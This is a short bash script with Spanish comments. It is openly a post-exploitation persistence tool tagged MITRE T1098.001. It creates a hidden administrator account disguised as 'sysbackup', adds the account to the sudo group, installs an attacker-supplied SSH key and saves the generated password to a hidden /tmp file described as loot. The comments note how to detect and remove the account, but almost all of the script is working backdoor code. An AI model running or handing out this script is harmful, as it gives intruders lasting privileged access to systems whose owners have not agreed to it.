#!/bin/bash

# Crea usuario persistente con sudo y SSH. Camuflado como "backup" admin.
# Funciona: Añade usuario oculto en logs, copia clave SSH para acceso sin pass.
# Persistencia: Sobrevive reboots via cuenta sistema.
# Detección: Revisar /etc/passwd, auth.log. Eliminar: userdel -r.
# MITRE: T1098.001.

USER=${1:-sysbackup}
SSH_KEY="$2"  # Clave pública requerida.
PASSWORD=$(openssl rand -base64 12)  # Aleatoria para sim.

if id "$USER" &>/dev/null; then
    echo "[+] Usuario $USER ya existe. Saltando." | tee -a /var/log/postops.log
    exit 0
fi

echo "[+] Creando usuario persistente: $USER" | tee -a /var/log/postops.log

sudo useradd -m -s /bin/bash "$USER" || { echo "Error en useradd"; exit 1; }
echo "$USER:$PASSWORD" | sudo chpasswd || { echo "Error en chpasswd"; exit 1; }
sudo usermod -aG sudo "$USER" || { echo "Error en usermod"; exit 1; }

sudo mkdir -p /home/"$USER"/.ssh
echo "$SSH_KEY" | sudo tee /home/"$USER"/.ssh/authorized_keys >/dev/null
sudo chown -R "$USER":"$USER" /home/"$USER"/.ssh
sudo chmod 700 /home/"$USER"/.ssh
sudo chmod 600 /home/"$USER"/.ssh/authorized_keys

echo "$PASSWORD" > /tmp/.persist_pass  # Temporal para loot.

echo "[+] Usuario creado: $USER (pass guardada temporalmente)" | tee -a /var/log/postops.log
